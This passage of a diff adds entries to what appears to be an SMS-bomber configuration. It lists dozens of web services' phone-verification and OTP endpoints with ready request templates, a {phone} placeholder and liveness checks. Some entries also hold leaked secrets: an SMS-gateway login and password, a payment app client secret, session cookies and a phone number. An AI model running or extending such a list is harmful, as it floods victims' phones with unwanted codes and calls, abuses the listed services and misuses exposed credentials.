+      "response": "[{\"alias\":\"bad_request\",\"description\":\"\\u041d\\u0435\\u043e\\u0431\\u0445\\u043e\\u0434\\u0438\\u043c\\u044b\\u0439 \\u043f\\u0430\\u0440\\u0430\\u043c\\u0435\\u0442\\u0440 (verificationToken) \\u043e\\u0442\\u0441\\u0443\\"
+    }
+  },
+  {
+    "id": "asset-304",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://ecco.ru/ajax/ajax.php",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "accept": "application/json, text/javascript, */*; q=0.01",
+          "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "cookie": "PHPSESSID=3r3f93pl81o62a1j08hctgnfkn; usessionid=a9db1c3d1b4a63985d8a752a09ce649fc4ccdc0294c9acc8b3a7eede1e1f4912-feddac604631ab9acf288e6f1fda5e45-3735684; segment5050=50-50.1; cart=a%3A0%3A%7B%7D; rr-VisitorSegment=2%3A2; _ym_uid=1712169510900994457; _ym_d=1712169510; _ga=GA1.2.527145042.1712169510; _gid=GA1.2.274625901.1712169510; _gat_UA-38888758-1=1; _ymab_param=8rhE5YrYlGfrrPz6uvtPH9ed2_hq7PIoHQI0wlnJNTugo3FRiQAKhBIevAquR1-bCgTcgFEwG01F2HwEU81mDAps29Q; _userGUID=0:luk5ip7q:xYBnUF5ivx32ccLDZ9XxqA_qH5todJux; dSesn=335f1a1f-f272-360b-4aea-34b04c1e63ca; _dvs=0:luk5ip7q:QSMxt_fQlB9QRktHZwX_c9S37Ys1Cz3B; cookie_popup=1; _ym_isad=1; _gat=1; _dc_gtm_UA-38888758-1=1; flocktory-uuid=61c00392-7013-4d5a-891c-d051aaae351a-5; tmr_lvid=fc88d704d0ecb442769cf66ff33dcdee; tmr_lvidTS=1712169513178; g4c_x=1; mindboxDeviceUUID=37a27b8e-d849-4d4f-a13d-e08db0e9ec15; directCrm-session=%7B%22deviceGuid%22%3A%2237a27b8e-d849-4d4f-a13d-e08db0e9ec15%22%7D; adrdel=1; adrcid=A3pzgO3BmBFewjiZKQ3Vk4w; _ym_visorc=b; tmr_detect=0%7C1712169515555; settings_autodetect_disable=1; settings_region_id=132; settings_country=%D0%92%D0%B5%D0%BB%D0%B8%D0%BA%D0%BE%D0%B1%D1%80%D0%B8%D1%82%D0%B0%D0%BD%D0%B8%D1%8F; settings_region=%D0%91%D0%BE%D0%BB%D1%8C%D1%88%D0%BE%D0%B9+%D0%9B%D0%BE%D0%BD%D0%B4%D0%BE%D0%BD; settings_town=%D0%9B%D0%BE%D0%BD%D0%B4%D0%BE%D0%BD; settings_autoregion=1; domain_sid=vpNslmab0QIMctCL-sDkf%3A1712169516029; Fuuid=c2002280-6e61-4dea-b987-227a840695cb,1712169516; Duuid=c2002280-6e61-4dea-b987-227a840695cb; Dsign=y; _gali=div_login_block; _ga_Z9MF4T28G9=GS1.1.1712169509.1.1.1712169534.0.0.0",
+          "origin": "https://ecco.ru",
+          "referer": "https://ecco.ru/",
+          "sec-ch-ua": "\"Microsoft Edge\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
+          "sec-ch-ua-mobile": "?0",
+          "sec-ch-ua-platform": "\"Windows\"",
+          "sec-fetch-dest": "empty",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-site": "same-origin",
+          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+          "x-requested-with": "XMLHttpRequest"
+        },
+        "data": {
+          "ajax_event": "set_auth_type",
+          "event": "ajax",
+          "show_description": "1",
+          "show_register": "1",
+          "auth_type": "phone",
+          "phone_login": "{phone:+7 (***) ***-**-**}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "asset-305",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://erck.ru/ajax/sms_code.php",
+        "headers": {
+          "Accept": "*/*",
+          "Accept-Language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+          "Connection": "keep-alive",
+          "Cookie": "PHPSESSID=7mi7b51bpkn3b52lge83cl2n86; utm_source=organic; loan_summ=7000; loan_period=14; _ym_uid=171242747869687122; _ym_d=1712427478; _ym_isad=2; waSessionId=205f56e7-2296-f23f-41db-901c2f7e2174; waUserId_1000131150-dubl_chat_bota_dlya_-1000131150-doc-20944757529=0eb95427-4bbf-e30f-86f5-327735a4728b",
+          "Referer": "https://erck.ru/",
+          "Sec-Fetch-Dest": "empty",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Site": "same-origin",
+          "X-Requested-With": "XMLHttpRequest",
+          "sec-ch-ua": "\"Microsoft Edge\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
+          "sec-ch-ua-mobile": "?0",
+          "sec-ch-ua-platform": "\"Windows\""
+        },
+        "params": {
+          "action": "send",
+          "phone": "{phone:+7(***)***-****}",
+          "via_call": "0",
+          "registration": "1",
+          "prolongation": "0",
+          "reset_password": "0",
+          "сonfirm_order": "0",
+          "hh": "5b4ca24d86513c145286b68f47848447"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"error\":\"\\u041f\\u0435\\u0440\\u0435\\u0433\\u0440\\u0443\\u0437\\u0438\\u0442\\u0435 \\u0441\\u0442\\u0440\\u0430\\u043d\\u0438\\u0446\\u0443, \\u0438 \\u043f\\u043e\\u043f\\u0440\\u043e\\u0431\\u0443\\u0439\\u0442\\u0435 \\u043"
+    }
+  },
+  {
+    "id": "bsl-qiwi",
+    "name": "Qiwi",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://mobile-api.qiwi.com/oauth/authorize",
+        "data": {
+          "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+          "username": "+{full_phone}",
+          "client_id": "android-qw",
+          "client_secret": "zAm4FKq9UnSe7id"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 401,
+      "why": "http:401+structured",
+      "response": "{\"error\":\"invalid_request\",\"error_description\":\"Request parameter value is not specified: recaptcha\",\"error_code\":\"1001\",\"user_message\":\"Кажется, что-то пошло не так. Повторите попытку позже.\"}"
+    }
+  },
+  {
+    "id": "bsl-oyorooms",
+    "name": "Oyorooms",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://www.oyorooms.com/api/pwa/generateotp?phone=+{full_phone}&country_code=%2B&nod=4&locale=en"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "OTP Sent!"
+    }
+  },
+  {
+    "id": "bsl-imgur",
+    "name": "Imgur",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.imgur.com/account/v1/phones/verify",
+        "data": {
+          "phone_number": "{phone}",
+          "region_code": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"data\":{\"error\":\"These actions are forbidden.\"},\"success\":false,\"status\":400}"
+    }
+  },
+  {
+    "id": "bsl-totopizza",
+    "name": "Totopizza",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.totopizza.ru/graphql",
+        "json": {
+          "operationName": "requestPhoneCodeAuth",
+          "query": "\\n  mutation requestPhoneCodeAuth($telephone:String!) {\\n    requestPhoneCodeAuth(telephone:$telephone)\\n  }\\n",
+          "variables": {
+            "telephone": "{phone}"
+          }
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"errors\":[{\"message\":\"Syntax Error: Cannot parse the unexpected character \\\"\\\\\\\\\\\".\",\"locations\":[{\"line\":1,\"column\":1}]}]}"
+    }
+  },
+  {
+    "id": "bsl-beerlogapizza",
+    "name": "Beerlogapizza",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://smsc.ru/sys/send.php",
+        "data": {
+          "login": "beerlogaa@gmail.com",
+          "psw": "QWE780p",
+          "phones": "+{full_phone}",
+          "mes": "code",
+          "call": "1",
+          "fmt": "3"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\n\"error\": \"authorise error\",\n\"error_code\": 2\n}"
+    }
+  },
+  {
+    "id": "bsl-expresspizzaby_by",
+    "name": "Expresspizzaby By",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://express-pizza.by/checkout.php?call=1",
+        "data": {
+          "tel": "+{full_phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-yamiyami",
+    "name": "YamiYami",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.new.yamiyami.ru/auth/register",
+        "headers": {
+          "Content-Type": "application/json",
+          "api-agent": "yamiyami"
+        },
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":1}"
+    }
+  },
+  {
+    "id": "bsl-onlinedoctor",
+    "name": "OnlineDoctor",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://onlinedoctor.ru/mobile/send_sms_code/",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"error\",\"errors\":\"\",\"message\":\"Возникла ошибка. Обновите страницу.\",\"code\":0,\"uid\":\"ff03766\"}"
+    }
+  },
+  {
+    "id": "bsl-valtaru",
+    "name": "ValtaRU",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://valta.ru/bitrix/services/main/ajax.php",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "bx-ajax": "true"
+        },
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"error\",\"data\":null,\"errors\":[{\"message\":\"Could not find description of  in Bitrix\\\\Main\\\\Engine\\\\DefaultController\",\"code\":22002,\"customData\":null}]}"
+    }
+  },
+  {
+    "id": "bsl-rentalclub",
+    "name": "RentalClub",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.rental-club.ru/v2/graphql",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "operationName": "SendConfirmationCode",
+          "variables": {
+            "phone": "+7{phone}"
+          },
+          "query": "mutation SendConfirmationCode($phone: String!) { authSendConfirmationCode(phone: $phone) { ok } }"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"errors\":[{\"message\":\"appCheckToken not provided\",\"locations\":[{\"line\":1,\"column\":50}],\"path\":[\"authSendConfirmationCode\"]}],\"data\":null}"
+    }
+  },
+  {
+    "id": "bsl-sunlight",
+    "name": "Sunlight",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.sunlight.net/v3/customers/authorization/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}",
+          "flashcall": true
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":{\"code\":200,\"success\":\"1\"},\"content\":{}}"
+    }
+  },
+  {
+    "id": "bsl-evraz",
+    "name": "EvrazMarket",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://spb.evraz.market/bitrix/services/main/ajax.php",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "userPhone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"error\",\"data\":null,\"errors\":[{\"message\":\"Could not find description of  in Bitrix\\\\Main\\\\Engine\\\\DefaultController\",\"code\":22002,\"customData\":null},{\"message\":\"[Bitrix\\\\Main\\\\SystemExceptio"
+    }
+  },
+  {
+    "id": "bsl-uteka",
+    "name": "Uteka",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://spb.uteka.ru/rpc/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "jsonrpc": "2.0",
+          "id": 8,
+          "method": "auth.GetCode",
+          "params": {
+            "phone": "{phone}"
+          }
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"jsonrpc\":\"2.0\",\"id\":8,\"error\":{\"code\":499,\"message\":\"Captcha validation errors\",\"data\":{\"url\":\"/captcha/\"}}}"
+    }
+  },
+  {
+    "id": "bsl-elementaree",
+    "name": "Elementaree",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api-new.elementaree.ru/graphql",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": "{\"query\": \"mutation{sendSmsCode(phone:\\\\\"+7{phone}\\\\\"){ok}}\"}"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"message\":\"Invalid JSON data in request body: Syntax error\",\"exception\":\"#0 /var/www/elementaree_api/releases/308/vendor/yiisoft/yii2/web/Request.php(623): yii\\\\web\\\\JsonParser->parse()\\n#1 /var/www/"
+    }
+  },
+  {
+    "id": "bsl-icq",
+    "name": "ICQ",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://u.icq.net/api/v89/rapi/auth/sendCode",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "msisdn": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\": {\"code\": 40000, \"reason\": \"Invalid json content: #: at least one subschema has failed, but all of them are required to validate - required property 'params' not found in object\"}}"
+    }
+  },
+  {
+    "id": "bsl-fonbet",
+    "name": "Fonbet",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":\"error\",\"errorCode\":1,\"errorMessage\":\"Некорректное заполнение полей.\",\"errorValue\":\"Empty deviceId.\"}"
+    }
+  },
+  {
+    "id": "bsl-mt_free",
+    "name": "Mt Free",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
+        "headers": {
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+          "App-ID": "cabinet",
+          "Cache-Control": "no-cache",
+          "Connection": "keep-alive",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "msisdn": "+7{phone}",
+          "g-recaptcha-response": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"code\":21,\"message\":\"Требуется reCAPTCHA\",\"data\":null}"
+    }
+  },
+  {
+    "id": "bsl-vesnashop",
+    "name": "Vesnashop",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://vesna.shop/bitrix/components/splash/auth/ajax.php",
+        "headers": {
+          "Accept": "application/json, text/javascript, */*; q=0.01",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Accept-Language": "ru,en;q=0.9",
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "referer": "https://vesna.shop/",
+          "x-requested-with": "XMLHttpRequest"
+        },
+        "data": {
+          "type": "auth",
+          "phone": "+7{phone}",
+          "vtr": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":\"error\",\"USER_ID\":0,\"option\":\"N\",\"new_user\":0,\"error\":\"error\",\"text_error\":\"\\u0412\\u0430\\u0448\\u0435 \\u043f\\u043e\\u0432\\u0435\\u0434\\u0435\\u043d\\u0438\\u0435 \\u043f\\u043e\\u0445\\u043e\\u0436\\u04"
+    }
+  },
+  {
+    "id": "bsl-sipnetru",
+    "name": "Sipnetru",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://register2.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone={phone}"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-moneyman",
+    "name": "Moneyman",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://msk.taxovichkof.ru/api/userSendSms",
+        "json": {
+          "username": "+7 (950) 213-5308",
+          "lang": "ru",
+          "city": "msk"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":0,\"data\":[],\"message\":\"prepareParams\",\"errors\":[]}"
+    }
+  },
+  {
+    "id": "bsl-evelux",
+    "name": "Evelux",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://evelux.ru/local/templates/evelux/ajax/confirm.phone.php",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "[]"
+    }
+  },
+  {
+    "id": "bsl-vladimir",
+    "name": "Vladimir",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?96.22364161776159",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "Bad query | U  | A  | R "
+    }
+  },
+  {
+    "id": "bsl-tb",
+    "name": "Tb",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://tb.tips4you.ru/auth/ajax/signup_action",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "Forbidden"
+    }
+  },
+  {
+    "id": "bsl-clientsapi01w",
+    "name": "Clientsapi01W",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://clientsapi01w.bk6bba-resources.com/cps/superRegistration/createProcess",
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":\"error\",\"errorCode\":1,\"errorMessage\":\"Некорректное заполнение полей.\",\"errorValue\":\"Empty deviceId.\"}"
+    }
+  },
+  {
+    "id": "bsl-BolshoeTV",
+    "name": "BolshoeTV",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.bolshoe.tv/v1/agregator/sendAuth",
+        "headers": {
+          "Content-Type": "application/json; charset=utf-8"
+        },
+        "json": {
+          "auth_type": "phone",
+          "uid": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":true,\"response\":{\"expired_at\":\"2026-10-12T16:22:28+00:00\",\"ttl_seconds\":180}}"
+    }
+  },
+  {
+    "id": "bsl-SberID_AB",
+    "name": "SberID AB",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://id.sber.ru/api/ab",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "platform": "web"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"experiments\":[{\"name\":\"sid_ru_tls_certificates_banner\",\"group\":\"sid_ru_tls_certificates_banner_control\"},{\"name\":\"sid_large_partner_name\",\"group\":\"sid_large_partner_name_enabled_b\"},{\"name\":\"sid_aut"
+    }
+  },
+  {
+    "id": "bsl-edostavka",
+    "name": "Edostavka",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://vladimir.edostav.ru/site/CheckAuthLogin",
+        "data": {
+          "phone_or_email": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"hasError\":false,\"data\":null,\"message\":{\"fieldType\":\"phone\",\"action\":\"\\/site\\/LoginBySMS\",\"phoneNumber\":\"+79991234567\"}}"
+    }
+  },
+  {
+    "id": "bsl-finam",
+    "name": "Finam",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.finam.ru/api/smslocker/sendcode",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"data\":null,\"error\":{\"msg\":\"SMS locker disabled\",\"code\":\"\"},\"status\":false}"
+    }
+  },
+  {
+    "id": "bsl-hatimaki",
+    "name": "Hatimaki",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.hatimaki.ru/register/",
+        "data": {
+          "REGISTER[LOGIN]": "+7{phone}",
+          "REGISTER[PERSONAL_PHONE]": "+7{phone}",
+          "REGISTER[EMAIL]": "test@test.com"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-invitro",
+    "name": "Invitro",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
+        "data": {
+          "login": "+7{phone}",
+          "password": "test123",
+          "application": "lkp"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"error\":\"Recapture token required\"}"
+    }
+  },
+  {
+    "id": "bsl-koronapay",
+    "name": "KoronaPay",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://koronapay.com/transfers/online/api/users/otps",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"timeToLive\":300000,\"retryDelay\":120000}"
+    }
+  },
+  {
+    "id": "bsl-makarolls",
+    "name": "Makarolls",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
+        "data": {
+          "data": "+7{phone}",
+          "metod": "postreg"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-mtstv",
+    "name": "MTSTV",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn=+7{phone}"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 204,
+      "why": "http:204",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-nncard",
+    "name": "NnCard",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://nn-card.ru/api/1.0/covid/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 405,
+      "why": "http:405+structured",
+      "response": "{\"statusCode\":405,\"error\":\"Method Not Allowed\",\"message\":\"Method Not Allowed\"}"
+    }
+  },
+  {
+    "id": "bsl-pirogino",
+    "name": "Pirogino",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
+        "data": {
+          "telephone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-qlean",
+    "name": "Qlean",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://sso.cloud.qlean.ru/http/users/requestotp?phone=+7{phone}&clientId=undefined&sessionId=4224",
+        "headers": {
+          "Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 500,
+      "why": "http:500+structured",
+      "response": "{\"statusCode\":500,\"message\":\"Internal server error\"}"
+    }
+  },
+  {
+    "id": "bsl-tvoyaapteka",
+    "name": "TvoyaApteka",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
+        "data": {
+          "tel": "+7{phone}",
+          "change_code": "1"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "Блок"
+    }
+  },
+  {
+    "id": "bsl-cloudloyalty",
+    "name": "CloudLoyalty",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
